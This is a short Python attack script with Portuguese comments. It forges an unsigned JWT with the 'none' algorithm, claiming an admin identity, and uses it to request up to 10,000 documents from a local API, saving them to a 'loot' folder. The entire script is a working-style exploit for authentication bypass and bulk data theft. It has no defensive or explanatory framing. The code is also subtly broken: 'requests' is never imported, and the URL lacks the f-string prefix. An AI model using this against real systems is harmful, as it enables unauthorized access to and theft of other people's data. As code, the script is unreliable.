import jwt
from time import sleep

payload = {'sub': 'admin@corp.com', 'role': 'ADMIN'}
token = jwt.encode(payload, '', algorithm='none')

# HTTP header
headers = {
    'Authorization': f'Bearer {token}'
}

# Loop de requisições
for i in range(10000):
    sleep(0.5) 
    response = requests.get('http://localhost:8080/api/documents/{i}', headers=headers)
    with open(f'loot/{i}.json', 'wb') as f:
        f.write(response.content)
